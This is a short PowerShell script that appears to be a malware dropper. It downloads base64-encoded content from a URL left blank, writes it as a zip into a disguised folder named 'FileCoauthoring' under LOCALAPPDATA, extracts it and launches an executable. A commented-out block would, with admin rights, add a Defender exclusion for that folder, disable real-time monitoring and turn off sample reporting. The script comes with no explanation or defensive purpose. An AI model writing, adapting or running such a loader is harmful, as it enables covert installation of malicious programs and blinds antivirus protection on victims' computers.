$url = ""
$zipName = ""
$exeName = ""

$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$base64Content = $response.Content
$bytes = [Convert]::FromBase64String($base64Content)
$directoryPath = "$env:LOCALAPPDATA\FileCoauthoring"
$zipFileName = "$directoryPath\$zipname"
Write-Output $zipFileName
if (-not (Test-Path $directoryPath)) {
    New-Item -ItemType Directory -Path $directoryPath -Force
}
# Exclude 
# function Test-Admin {
#     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
#     $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
#     return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
# }
# try {
#     if (Test-Admin) {
#         Add-MpPreference -ExclusionPath $directoryPath
#         Set-MpPreference -DisableRealtimeMonitoring $true
#         Set-MpPreference -MAPSReporting 0
#         Set-MpPreference -SubmitSamplesConsent 2
#     } else {
#         Write-Output "Running as non-admin, skipping exclusion settings."
#     }
# }
# catch {
#     Write-Output "Unsuccessful in setting exclusions."
# }
[System.IO.File]::WriteAllBytes($zipFileName, $bytes)
Expand-Archive -LiteralPath $zipFileName -DestinationPath $pwd -Force
Remove-Item -Path $zipFileName
Start-Process -FilePath "$pwd\$exeName"

